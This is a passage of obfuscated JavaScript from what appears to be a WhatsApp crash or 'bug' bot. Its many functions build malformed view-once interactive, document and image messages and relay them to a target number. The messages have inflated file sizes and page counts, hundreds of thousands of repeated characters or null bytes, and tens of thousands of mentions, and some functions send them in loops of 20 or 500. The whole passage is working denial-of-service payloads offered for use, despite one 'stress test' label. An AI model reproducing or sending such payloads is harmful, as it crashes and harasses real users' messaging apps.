                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x26fca9,
        quoted: VisiXLoc
      });
      await _0x4b53e5.relayMessage(_0x26fca9, _0x19c0c4.message, _0x15ad6e ? {
        participant: {
          jid: _0x26fca9
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
    }
    async function _0xeec952(_0x5c2d01, _0x5585f6, _0x5bee85 = false, _0x103038 = false) {
      let _0x5837a2 = generateWAMessageFromContent(_0x5c2d01, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: _0x5585f6
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [_0x5bee85 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰dev😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x5c2d01,
        quoted: VisiX
      });
      await _0x4b53e5.relayMessage(_0x5c2d01, _0x5837a2.message, _0x103038 ? {
        participant: {
          jid: _0x5c2d01
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
    }
    async function _0x4ad2d9(_0x460c09, _0x3530b6, _0x2995d8 = false, _0x1730ff = false) {
      let _0x381aa3 = generateWAMessageFromContent(_0x460c09, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: _0x3530b6
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [_0x2995d8 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x460c09,
        quoted: EsQl
      });
      await _0x4b53e5.relayMessage(_0x460c09, _0x381aa3.message, _0x1730ff ? {
        participant: {
          jid: _0x460c09
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
    }
    async function _0x2f7ba8(_0x5cc16c, _0x1a599a, _0x18dbe2, _0x3ac56c = false, _0x57b9e3 = true) {
      for (let _0x1d7dfa = 0; _0x1d7dfa < 20; _0x1d7dfa++) {
        let _0x461f82 = generateWAMessageFromContent(_0x5cc16c, proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ dev ⿻",
                    fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: _0x18dbe2
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "⭑̤▾ ⿻ dev Ui ⿻ ▾⭑ꦾ" + "ꦾ".repeat(77777)
                },
                nativeFlowMessage: {
                  messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
                }
              }
            }
          }
        }), {
          userJid: _0x5cc16c,
          quoted: _0x1a599a,
          fromMe: false
        });
        await _0x4b53e5.relayMessage(_0x5cc16c, _0x461f82.message, _0x57b9e3 ? {
          participant: {
            jid: _0x5cc16c
          }
        } : {});
        console.log(_0x3e6b4d.green("Message " + (_0x1d7dfa + 1) + "/20 sent by ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
      }
    }
    async function _0x5671c6(_0x1646eb, _0xbba188, _0x395345, _0x57853a = false, _0x394171 = false) {
      let _0x38ac44 = generateWAMessageFromContent(_0x1646eb, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⿻ dev ⿻",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: _0x395345
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤" + "ꦾ".repeat(70000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [_0x57853a ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"\n⿻ dev ⿻\n\n" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"⿻ dev ⿻\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x1646eb,
        quoted: _0xbba188
      });
      await _0x4b53e5.relayMessage(_0x1646eb, _0x38ac44.message, _0x394171 ? {
        participant: {
          jid: _0x1646eb
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
    }
    async function _0x23fd79(_0x2a251e, _0x48adcb, _0x4b6d63, _0x3b8911 = true) {
      const _0x44e08c = {
        text: _0x48adcb,
        format: "EXTENSIONS_1"
      };
      await _0x4b53e5.relayMessage(_0x2a251e, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: _0x44e08c,
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(_0x4b6d63) + "\",\"screen_0_TextInput_1\":\"anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, _0x3b8911 ? {
        participant: {
          jid: _0x2a251e
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ DEVIL 🥷🏽🔥 ⿻ ▾⭑"));
    }
    async function _0x4e135a(_0xefe050, _0x31460d, _0x2e8c07, _0x39d389 = true) {
      const _0x45996b = {
        text: _0x2e8c07
      };
      let _0x2db5b3 = generateWAMessageFromContent(_0xefe050, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: _0x45996b,
              nativeFlowMessage: {
                messageParamsJson: " znx guarantees all phones :) \n\n\n I know, you tried to copy this bug with m.quoted/m.message, right ? "
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: _0xefe050,
        quoted: _0x31460d
      });
      await _0x4b53e5.relayMessage(_0xefe050, _0x2db5b3.message, _0x39d389 ? {
        participant: {
          jid: _0xefe050
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ DEVIL 🥷🏽🔥❤️ ⿻ ▾⭑"));
    }
    async function _0x597974(_0x24f61d, _0x559238 = true) {
      let _0x46dc12 = generateWAMessageFromContent(_0x24f61d, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤"
              },
              nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: " ꦾ "
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: _0x24f61d,
        quoted: Qrad
      });
      await _0x4b53e5.relayMessage(_0x24f61d, _0x46dc12.message, _0x559238 ? {
        participant: {
          jid: _0x24f61d
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x4232d5(_0x45e18d, _0x2e2546, _0x4ab3b2, _0x1747f4 = false) {
      let _0xf404e4 = generateWAMessageFromContent(_0x45e18d, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            imageMessage: {
              mimetype: "image/jpeg",
              caption: "⭑̤⟅̊༑ ▾ ̶H̶e̶r̶a̶I̶s̶h̶e̶r̶e ⿻ 㾦㾹㾹㾮ܛܩܡܤܡܦ ⿻ ▾ ༑̴⟆̊‏‎‏‎̶g̶r̶t‎‏⭑̤" + "ܧ".repeat(100000),
              jpegThumbnail: _0x4ab3b2,
              fileLength: "9999999999999",
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              mediaKeyTimestamp: "1723855952",
              contextInfo: {
                forwardingScore: 1000,
                isForwarded: true,
                externalAdReply: {
                  title: "🚨 Parsing Stress Test 🚨",
                  body: "Test Data Overflow",
                  previewType: "VIDEO",
                  thumbnailUrl: "https://via.placeholder.com/600x400.png",
                  sourceUrl: "https://rehan.icikiwir.com"
                }
              }
            },
            documentMessage: {
              title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
              fileName: "Stress_Test_Parsing",
              pageCount: 2147483647,
              mimetype: "application/pdf",
              jpegThumbnail: _0x4ab3b2
            }
          }
        }
      }), {
        userJid: _0x45e18d,
        quoted: _0x2e2546
      });
      for (let _0x3e574b = 0; _0x3e574b < 500; _0x3e574b++) {
        await _0x4b53e5.relayMessage(_0x45e18d, _0xf404e4.message, _0x1747f4 ? {
          participant: {
            jid: _0x45e18d
          }
        } : {});
        console.log("🚀 Test payload sent successfully! Iteration: " + (_0x3e574b + 1));
      }
    }
    async function _0x6bb750(_0x573faa, _0x39c24c = true) {
      let _0x182f70 = generateWAMessageFromContent(_0x573faa, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ▾ ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " ZnX Company Tagline Here!! \n\n\n You Stupid?? ",
                buttons: [{
                  name: "payment_info",
                  buttonParamsJson: "{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x573faa
      });
      await _0x4b53e5.relayMessage(_0x573faa, _0x182f70.message, _0x39c24c ? {
        participant: {
          jid: _0x573faa
        }
      } : {});
    }
    async function _0x4f4289(_0x3e03e3) {
      await _0x4b53e5.relayMessage(_0x3e03e3, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                subtitle: "ꦾ".repeat(900000),
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "ꦾ"
              },
              nativeFlowMessage: {
                messageParamsJson: ""
              },
              carouselMessage: {}
            }
          }
        }
      }, {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x5d80ac(_0x56affd, _0x2fc5b9) {
      await _0x4b53e5.relayMessage(_0x56affd, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝" + "\0".repeat(900000)
              },
              nativeFlowMessage: {
                messageParamsJson: ""
              },
              carouselMessage: {}
            }
          }
        }
      }, {
        participant: {
          jid: _0x56affd
        }
      });
      let _0x15aac3 = _0x4d1a4f.readFileSync("./system/image/XY.webp");
      const _0x9405e = {
        sticker: _0x15aac3
      };
      const _0x19137d = {
        quoted: _0x2fc5b9
      };
      await _0x4b53e5.sendMessage(_0x56affd, _0x9405e, _0x19137d);
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x2a9ad6(_0x430c2c, _0x2e1204) {
      const _0x37dee7 = {
        quoted: _0x2e1204
      };
      await _0x4b53e5.sendMessage(_0x430c2c, {
        text: "🦋⃟ᴠͥɪͣᴘͫ•𝗨𝗡𝗟𝗢𝗖𝗞 𝗕𝗨𝗚•🦋⃟ᴠͥɪͣᴘͫ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🦋⃟ᴠͥɪͣᴘͫ•𝗨𝗡𝗟𝗢𝗖𝗞 𝗕𝗨𝗚•🦋⃟ᴠͥɪͣᴘͫ"
      }, _0x37dee7);
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x48a443(_0x205f89, _0x49a602, _0x2a76d0 = true) {
      const _0x194737 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: _0x49a602
      };
      const _0x3289c7 = {
        documentMessage: _0x194737,
        hasMediaAttachment: true
      };
      await _0x4b53e5.relayMessage(_0x205f89, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: _0x3289c7,
              body: {
                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 System⿻ ▾⭑̤\n" + "@6283846077142".repeat(17000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6283846077142@s.whatsapp.net", ...Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, _0x2a76d0 ? {
        participant: {
          jid: _0x205f89
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0xe3a42f(_0x52a013, _0x73a4db, _0x38af8f = true) {
      const _0x46a046 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
